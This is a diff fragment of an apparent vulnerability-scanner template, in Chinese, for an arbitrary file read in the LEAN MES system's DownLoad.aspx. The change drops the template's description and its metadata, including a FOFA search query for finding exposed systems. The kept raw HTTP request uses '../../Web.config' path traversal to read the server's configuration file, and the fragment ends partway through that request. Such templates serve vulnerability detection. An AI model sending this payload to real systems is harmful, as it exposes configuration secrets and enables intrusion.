@@ -3,12 +3,8 @@ info:
   name: 深科特LEAN MES系统DownLoad.aspx存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kvphzc9xk8c476wz'
+  description: ''
   tags: lfi,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: kvphzc9xk8c476wz
-    fofa: (title="LEAN MES - 用户登录" || body="Content/js/skt.utility.checkmobile.js" || body="../MobileApp/VerifyError.aspx" || body="Content/login/login2/multiplant_top.png")
 http:
 - raw:
   - 'GET /ESOP/DownLoad.aspx?fileName=../../Web.config&Action= HTTP/1.1
